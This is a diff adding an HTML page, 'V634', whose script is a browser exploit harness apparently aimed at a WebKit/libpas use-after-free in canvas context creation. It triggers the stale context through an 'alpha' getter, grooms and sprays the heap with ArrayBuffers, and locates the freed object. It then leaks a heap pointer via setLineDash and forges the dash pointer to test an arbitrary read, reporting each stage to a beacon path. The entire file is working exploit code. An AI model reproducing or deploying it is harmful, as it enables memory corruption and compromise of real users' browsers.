@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V634</title></head>
+<body><pre id="out">V634</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<60;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){var img=_imgs[_ix++%60];img.src='/beacon/V634-'+tag+'?d='+encodeURIComponent(String(d).slice(0,600))+'&t='+Date.now();}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _b8b=new ArrayBuffer(8),_bu64;
+try{_bu64=new BigUint64Array(_b8b);}catch(e){}
+var _f64b=new Float64Array(_b8b);
+function f2h(v){_f64[0]=v;return ('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function f2i(v){if(_bu64){_f64b[0]=v;return _bu64[0];}return null;}
+
+bk('BOOT','v634-zero-latency');
+
+/* TEST 1: ZERO-LATENCY stale read — NO groom, NO spray, IMMEDIATE read.
+ * If libpas doesn't decommit instantly, this succeeds. */
+var c1=document.createElement('canvas');c1.width=1;c1.height=1;
+var ic1=null;
+var o1={};
+Object.defineProperty(o1,'alpha',{get:function(){
+  ic1=c1.getContext('2d');
+  for(var i=0;i<8;i++) ic1.save();
+  ic1.lineWidth=3.14159;
+  return true;
+}});
+c1.getContext('bitmaprenderer',o1);
+/* IMMEDIATE read — zero allocations between UAF and read */
+var t1lw=-999;
+try{t1lw=ic1.lineWidth;}catch(e){t1lw=-888;}
+bk('T1','lw='+t1lw+',hex='+f2h(t1lw));
+ic1=null;c1=null;
+
+/* TEST 2: Same but with 0 saves (inline stateStack only).
+ * Only reads from the 768B context slot, not an external buffer. */
+var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+var ic2=null;
+var o2={};
+Object.defineProperty(o2,'alpha',{get:function(){
+  ic2=c2.getContext('2d');
+  ic2.lineWidth=42.42;
+  ic2.miterLimit=88.88;
+  return true;
+}});
+c2.getContext('bitmaprenderer',o2);
+var t2lw=-999,t2ml=-999;
+try{t2lw=ic2.lineWidth;}catch(e){t2lw=-888;}
+try{t2ml=ic2.miterLimit;}catch(e){t2ml=-888;}
+bk('T2','lw='+t2lw+',ml='+t2ml);
+ic2=null;c2=null;
+
+/* TEST 3: With 768B groom (115 objects), 8 saves, immediate read.
+ * Tests if grooming keeps page committed. */
+var g3=new Array(115);
+for(var g=0;g<115;g++) g3[g]=new ArrayBuffer(768);
+var c3=document.createElement('canvas');c3.width=1;c3.height=1;
+var ic3=null;
+var o3={};
+Object.defineProperty(o3,'alpha',{get:function(){
+  ic3=c3.getContext('2d');
+  for(var i=0;i<8;i++) ic3.save();
+  ic3.lineWidth=7.77;
+  return true;
+}});
+c3.getContext('bitmaprenderer',o3);
+var t3lw=-999;
+try{t3lw=ic3.lineWidth;}catch(e){t3lw=-888;}
+bk('T3','lw='+t3lw);
+ic3=null;c3=null;
+
+/* TEST 4: With 768B groom (115) + 4608B groom (59), immediate read + AB spray.
+ * Full Portablelle chain. */
+var g4a=new Array(115);
+for(var g=0;g<115;g++) g4a[g]=new ArrayBuffer(768);
+var g4b=new Array(59);
+for(var g=0;g<59;g++) g4b[g]=new ArrayBuffer(4608);
+
+var c4=document.createElement('canvas');c4.width=1;c4.height=1;
+var ic4=null;
+var o4={};
+Object.defineProperty(o4,'alpha',{get:function(){
+  ic4=c4.getContext('2d');
+  for(var i=0;i<8;i++) ic4.save();
+  ic4.lineWidth=3.14159;
+  return true;
+}});
+c4.getContext('bitmaprenderer',o4);
+
+/* Immediate pre-spray read */
+var t4pre=-999;
+try{t4pre=ic4.lineWidth;}catch(e){t4pre=-888;}
+bk('T4A','pre='+t4pre);
+
+/* AB spray (small: 10 only to avoid GC) */
+var abs4=new Array(10);
+for(var i=0;i<10;i++) abs4[i]=new ArrayBuffer(4608);
+
+/* Post-spray read */
+var t4post=-999;
+try{t4post=ic4.lineWidth;}catch(e){t4post=-888;}
+bk('T4B','post='+f2h(t4post));
+
+/* Write marker + scan */
+try{ic4.lineWidth=1.717;}catch(e){}
+var hit4=-1;
+var LW_OFF=8*400+48;
+var expIdx=LW_OFF/8;
+for(var j=0;j<10;j++){
+  var fv=new Float64Array(abs4[j]);
+  if(fv[expIdx]===1.717){hit4=j;break;}
+  for(var k=Math.max(0,expIdx-10);k<Math.min(fv.length,expIdx+10);k++){
+    if(fv[k]===1.717){hit4=j;break;}
+  }
+  if(hit4>=0)break;
+}
+bk('T4C','hit='+hit4);
+
+/* Heap leak via setLineDash */
+var LD_OFF=8*400+168;
+var leak4=0n,lok4=0;
+if(hit4>=0){
+  var dv=new DataView(abs4[hit4]);
+  try{
+    ic4.setLineDash([1.0,2.0,3.0,4.0]);
+    leak4=dv.getBigUint64(LD_OFF,true);
+    lok4=1;
+  }catch(e){lok4=-1;}
+}
+if(lok4===1 && leak4>0n){
+  bk('LEAK','***0x'+leak4.toString(16)+'***');
+  say('*** HEAP LEAK: 0x'+leak4.toString(16)+' ***');
+  
+  /* Verify arb read */
+  var dv2=new DataView(abs4[hit4]);
+  dv2.setBigUint64(LD_OFF,leak4,true);
+  dv2.setUint32(LD_OFF+8,4,true);
+  dv2.setUint32(LD_OFF+12,4,true);
+  var rd;
+  try{rd=ic4.getLineDash();}catch(e){rd=[];}
+  bk('ARB','len='+rd.length+',v0='+rd[0]+',v1='+rd[1]);
+  say('ARB: ['+rd[0]+','+rd[1]+','+rd[2]+','+rd[3]+']');
+}else{
+  bk('NOLEAK','s='+lok4);
+}
+
+c4._g=g4a;c4._g2=g4b;c4._a=abs4;
+say('T1='+t1lw+' T2='+t2lw+'/'+t2ml+' T3='+t3lw);
+say('T4: pre='+t4pre+' post='+f2h(t4post)+' hit='+hit4);
+bk('DONE','v634');
+say('DONE');
+</script>
+</body></html>
